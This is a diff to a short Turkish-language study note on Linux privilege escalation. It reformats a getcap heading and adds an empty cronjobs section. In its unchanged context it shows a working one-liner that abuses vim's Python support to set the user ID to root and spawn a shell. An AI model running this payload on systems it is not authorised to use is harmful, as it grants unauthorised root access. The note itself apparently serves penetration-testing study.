@@ -1,6 +1,6 @@
 Ayrıcalık Yükseltme Yetenekleri:
 
-*** getcap ile priv esc ***
+# getcap ile priv esc
 
 
 ```bash
@@ -17,3 +17,12 @@ Vim'in aşağıdaki komut ve yük ile kullanılabileceğini fark ediyoruz:
 ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 ```
 ![image](https://github.com/user-attachments/assets/fda3d99b-ff2c-431b-8742-920c643d51a0)
+
+---
+
+# Cronjobs ile priv esc
+
+```bash
+
+```
+
